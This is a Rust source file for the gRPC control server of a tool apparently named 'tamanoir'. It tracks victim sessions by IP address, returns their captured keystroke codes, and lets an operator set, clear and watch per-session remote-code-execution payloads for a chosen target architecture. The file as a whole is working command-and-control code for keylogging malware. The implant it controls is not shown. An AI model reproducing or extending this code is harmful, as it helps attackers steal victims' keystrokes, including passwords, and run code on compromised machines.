use std::{net::Ipv4Addr, pin::Pin, str::FromStr};

use log::{debug, info};
use tokio_stream::Stream;
use tonic::{transport::Server, Code, Request, Response, Status};

use crate::{
    tamanoir_grpc::{
        proxy_server::{Proxy, ProxyServer},
        DeleteSessionRceRequest, Empty, ListSessionsResponse, SessionRcePayload, SessionResponse,
        SetSessionRceRequest,
    },
    SessionsStore, TargetArch,
};

pub async fn serve_tonic(grpc_port: u16, sessions_store: SessionsStore) -> anyhow::Result<()> {
    let addr = format!("0.0.0.0:{}", grpc_port).parse().unwrap();
    info!("Starting grpc server");
    debug!("Grpc server is listening on {}", addr);
    Server::builder()
        .add_service(ProxyServer::new(sessions_store))
        .serve(addr)
        .await?;
    Ok(())
}

#[tonic::async_trait]
impl Proxy for SessionsStore {
    async fn list_sessions(
        &self,
        request: Request<Empty>,
    ) -> Result<Response<ListSessionsResponse>, Status> {
        debug!(
            "<GetSessions> Got a request from {:?}",
            request.remote_addr()
        );
        let current_sessions = self.sessions.lock().await;

        let mut sessions: Vec<SessionResponse> = vec![];
        for s in current_sessions.values().into_iter() {
            let rce_payload: Option<SessionRcePayload> = match &s.rce_payload {
                Some(payload) => Some(SessionRcePayload {
                    length: payload.length as u32,
                    buffer_length: payload.buffer.len() as u32,
                }),
                _ => None,
            };
            sessions.push(SessionResponse {
                ip: s.ip.to_string(),
                key_codes: s.key_codes.iter().map(|byte| *byte as u32).collect(),
                rce_payload: rce_payload,
            })
        }

        let reply = ListSessionsResponse { sessions };
        Ok(Response::new(reply))
    }
    async fn delete_session_rce(
        &self,
        request: Request<DeleteSessionRceRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<DeleteSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::NotFound, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;

        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                existing_session.reset_rce_payload();
                self.try_send(existing_session.clone())
                    .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;

                Ok(Response::new(Empty {}))
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
    async fn set_session_rce(
        &self,
        request: Request<SetSessionRceRequest>,
    ) -> Result<Response<Empty>, Status> {
        debug!(
            "<SetSessionRce> Got a request from {:?}",
            request.remote_addr()
        );
        let req = request.into_inner();
        let ip = Ipv4Addr::from_str(&req.ip)
            .map_err(|_| Status::new(Code::InvalidArgument, format!("{}: invalid ip", req.ip)))?;

        let mut current_sessions = self.sessions.lock().await;
        let target_arch = TargetArch::from_str(&req.target_arch).map_err(|_| {
            Status::new(
                Code::InvalidArgument,
                format!("{}: unknown target arch", req.target_arch),
            )
        })?;
        match current_sessions.get_mut(&ip) {
            Some(existing_session) => {
                match existing_session.set_rce_payload(&req.rce, target_arch) {
                    Ok(_) => {
                        self.try_send(existing_session.clone())
                            .map_err(|e| Status::new(Code::Internal, format!("{}", e)))?;
                        Ok(Response::new(Empty {}))
                    }
                    Err(_) => Err(Status::new(
                        Code::InvalidArgument,
                        format!("{}: invalid rce", req.rce),
                    )),
                }
            }
            None => Err(Status::new(
                Code::NotFound,
                format!("{}: session not found", ip),
            )),
        }
    }
    type WatchSessionsStream =
        Pin<Box<dyn Stream<Item = Result<SessionResponse, Status>> + Send + 'static>>;

    async fn watch_sessions(
        &self,
        _request: Request<Empty>,
    ) -> Result<Response<Self::WatchSessionsStream>, Status> {
        let mut rx = self.tx.subscribe();

        let stream = async_stream::try_stream! {
        while let Ok(session) = rx.recv().await {

                let rce_payload:Option<SessionRcePayload> = match session.rce_payload   {
                    Some(payload) => Some(SessionRcePayload {length:payload.length as u32,buffer_length:payload.buffer.len() as u32}),
                    _ => None,
                };

                yield SessionResponse {
                    ip: session.ip.to_string(),
                    key_codes: session.key_codes.iter().map(|byte| *byte as u32).collect(),
                    rce_payload: rce_payload
                };


        }
        };
        Ok(Response::new(Box::pin(stream) as Self::WatchSessionsStream))
    }
}
